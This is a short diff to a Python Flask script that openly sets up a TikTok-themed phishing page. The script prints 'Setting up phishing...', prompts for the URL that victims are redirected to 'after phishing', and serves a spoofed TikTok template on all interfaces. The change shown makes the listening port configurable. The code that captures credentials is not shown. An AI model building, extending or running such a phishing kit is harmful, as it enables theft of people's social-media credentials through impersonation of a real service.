@@ -3,6 +3,17 @@ from flask import Flask, render_template, request, redirect, url_for
 
 print('Setting up phishing...')
 action_url = input('Enter the URL to redirect users after phishing: ')
+port = input("Enter the port of your site (Default: 8080): ")
+
+# Set default port if not provided
+if not port:
+    port = 8080
+else:
+    try:
+        port = int(port)
+    except ValueError:
+        print("Invalid port number. Using default port 8080.")
+        port = 8080
 
 app = Flask(__name__, template_folder='Phishing/templates/TIKTok')
 username = None
@@ -44,4 +55,4 @@ def welcome():
 
 if __name__ == '__main__':
     print("Starting the server...")
-    app.run(host='0.0.0.0', port=8088)
+    app.run(host='0.0.0.0', port=port)
